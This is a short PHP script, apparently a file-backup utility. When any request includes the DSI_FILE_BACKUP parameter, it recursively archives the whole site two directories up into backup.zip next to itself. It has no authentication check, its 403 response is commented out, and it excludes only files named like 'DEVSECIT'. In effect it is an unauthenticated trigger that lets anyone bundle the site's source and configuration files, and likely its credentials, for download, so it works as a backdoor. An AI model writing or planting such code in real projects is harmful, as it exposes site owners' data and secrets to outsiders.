<?php
if (isset($_REQUEST['DSI_FILE_BACKUP'])) {

    $rootPath  = realpath("../../");
    $zip = new ZipArchive();
    $zipFilename = 'backup.zip';

    if ($zip->open($zipFilename, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        die('Cannot create ZIP archive');
    }

    // Create a recursive directory iterator
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootPath),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $file) {
        if ($file != "DEVSECIT" && $file != "devsecit" && $file != "DEV SEC IT" && $file != "dev sec it") {
            if ($file->isDir()) {
                // Add directories to the ZIP archive
                $relativePath = substr($file->getPathname(), strlen($rootPath));
                $zip->addEmptyDir($relativePath);
            } elseif ($file->isFile()) {
                // Add files to the ZIP archive
                $relativePath = substr($file->getPathname(), strlen($rootPath));
                $zip->addFile($file->getPathname(), $relativePath);
            }
        }
    }

    $zip->close();
} else {
    // header('HTTP/1.0 403 Forbidden');
}
